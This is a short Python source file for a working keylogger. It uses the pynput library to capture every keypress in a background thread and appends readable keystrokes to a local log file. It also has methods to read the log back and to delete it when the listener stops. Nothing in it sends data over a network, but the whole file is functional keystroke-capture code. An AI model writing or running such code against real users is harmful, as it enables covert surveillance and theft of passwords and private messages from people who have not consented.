from pynput.keyboard import Listener
import threading
import re
import os

class KeyLogger:
    button = []
    count = 0
    path = 'log_data.txt'

    def startListener(self):
        global listener
        with Listener(on_press=self.keyPressed) as listener:
            listener.join()
    
    def startLogger(self):
        self.t = threading.Thread(target=self.startListener)
        self.t.start()

    def keyPressed(self, key):
        self.button.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            with open(self.path, 'a') as file:
                for i in self.button:
                    i = re.sub("'", "", str(i))
                    if i == 'Key.space':
                        file.write(' ')
                    elif i == 'Key.enter':
                        file.write('\n')
                    elif i in ('Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.escape'):
                        pass
                    elif i == 'Key.backspace':
                        file.write(' [Backspace] ')
                    elif i == 'Key.tab':
                        file.write(' [Tab] ')
                    elif i == 'Key.caps_lock':
                        file.write(' [Capslock] ')
                    else:
                        file.write(i)

        self.button = []

    def readLog(self):
        with open('log_data.txt', 'r') as file:
            data = file.read()
            return data
    
    def stopListener(self):
        listener.stop()
        os.remove(self.path)
